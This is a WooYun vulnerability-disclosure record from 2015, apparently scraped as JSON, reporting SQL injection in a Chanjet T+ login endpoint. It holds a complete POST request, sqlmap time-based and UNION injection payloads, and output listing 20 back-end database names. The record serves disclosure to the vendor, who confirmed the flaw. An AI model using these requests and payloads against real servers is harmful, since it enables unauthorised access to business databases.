{"id": 29908, "wybug_id": "wooyun-2015-0117971", "wybug_title": "畅捷通某站SQL注入（支持UNION注入）", "wybug_corp": "畅捷通", "wybug_author": "天地不仁 以万物为刍狗", "wybug_date": "2015-06-03 15:13", "wybug_open_date": "2015-07-18 16:06", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-13：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-23：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-18：\t细节向公众公开  简要描述： 【HD】 以团队之名 以个人之荣耀 共建网络安全 详细说明：  POST数据包：\nPOST /TPlus/ajaxpro/Login,App_Web_login.aspx.cdcab7d2.ashx HTTP/1.1Host: tpupdate.chanjet.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; rv:33.0) Gecko/20100101 Firefox/33.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: text/plain; charset=utf-8X-AjaxPro-Method: GetAccountsByUserReferer: http://tpupdate.chanjet.com/TPlus/login.aspxContent-Length: 67Cookie: sysLoginState=T3; ASP.NET_SessionId=rrz2lngikecuglnxrmbe50lg; CheckCode=NJ644X-Forwarded-For: 8.8.8.8Connection: keep-alivePragma: no-cacheCache-Control: no-cache{\"userName\":\"admin\",\"pwd\":\"admin\",\"includeHide\":false,\"aqdKey\":\"*\"}\nappkey参数 时间注入\n\n20个数据库（具体参数可见 底下的漏洞证明）随便找了三个库 看了下表数量 发现挺多的\n\n\n\n\n\n后面就不继续深入了  点到为止嘛   漏洞证明：  \n(custom) POST parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] nsqlmap identified the following injection points with a total of 74 HTTP(s) requests:---Parameter: #1* ((custom) POST)    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: {\"userName\":\"admin\",\"pwd\":\"admin\",\"includeHide\":false,\"aqdKey\":\"';WAITFOR DELAY '0:0:20'--\"}    Type: UNION query    Title: Generic UNION query (NULL) - 7 columns    Payload: {\"userName\":\"admin\",\"pwd\":\"admin\",\"includeHide\":false,\"aqdKey\":\"' UNION ALL SELECT NULL,CHAR(113)+CHAR(118)+CHAR(107)+CHAR(98)+CHAR(113)+CHAR(69)+CHAR(85)+CHAR(115)+CHAR(74)+CHAR(82)+CHAR(111)+CHAR(67)+CHAR(82)+CHAR(72)+CHAR(104)+CHAR(113)+CHAR(112)+CHAR(107)+CHAR(106)+CHAR(113),NULL,NULL-- \"}---[14:44:22] [INFO] testing Microsoft SQL Server[14:44:22] [INFO] confirming Microsoft SQL Server[14:44:23] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windowsweb application technology: ASP.NET 4.0.30319, Nginx, ASP.NETback-end DBMS: Microsoft SQL Server 2008[14:44:23] [INFO] fetching database names[14:44:23] [INFO] the SQL query used returns 20 entries[14:44:23] [INFO] retrieved: chanjet_package[14:44:24] [INFO] retrieved: master[14:44:24] [INFO] retrieved: model[14:44:24] [INFO] retrieved: msdb[14:44:24] [INFO] retrieved: tempdb[14:44:24] [INFO] retrieved: TPlusData[14:44:25] [INFO] retrieved: UFTData115807_000005[14:44:25] [INFO] retrieved: UFTData158162_000098[14:44:25] [INFO] retrieved: UFTData187230_000096[14:44:25] [INFO] retrieved: UFTData31904_000002[14:44:25] [INFO] retrieved: UFTData31904_000097[14:44:26] [INFO] retrieved: UFTData468813_000003[14:44:26] [INFO] retrieved: UFTData580095_888888[14:44:26] [INFO] retrieved: UFTData600869_000001[14:44:26] [INFO] retrieved: UFTData633239_000004[14:44:27] [INFO] retrieved: UFTData644029_000002[14:44:27] [INFO] retrieved: UFTData787759_000008[14:44:27] [INFO] retrieved: UFTData801045_100001[14:44:27] [INFO] retrieved: UFTData997842_200001[14:44:27] [INFO] retrieved: UFTSystemavailable databases [20]:[*] chanjet_package[*] master[*] model[*] msdb[*] tempdb[*] TPlusData[*] UFTData115807_000005[*] UFTData158162_000098[*] UFTData187230_000096[*] UFTData31904_000002[*] UFTData31904_000097[*] UFTData468813_000003[*] UFTData580095_888888[*] UFTData600869_000001[*] UFTData633239_000004[*] UFTData644029_000002[*] UFTData787759_000008[*] UFTData801045_100001[*] UFTData997842_200001[*] UFTSystem[14:44:28] [INFO] fetched data logged to text files under 'C:\\Users\\Administrator\\.sqlmap\\output\\tpupdate.chanjet.com'[*] shutting down at 14:44:28\n   修复方案：     版权声明：转载请注明来源 天地不仁 以万物为刍狗@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-06-03 16:04 厂商回复： 感谢您对我们的关注和支持，该问题存在，我们正在修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}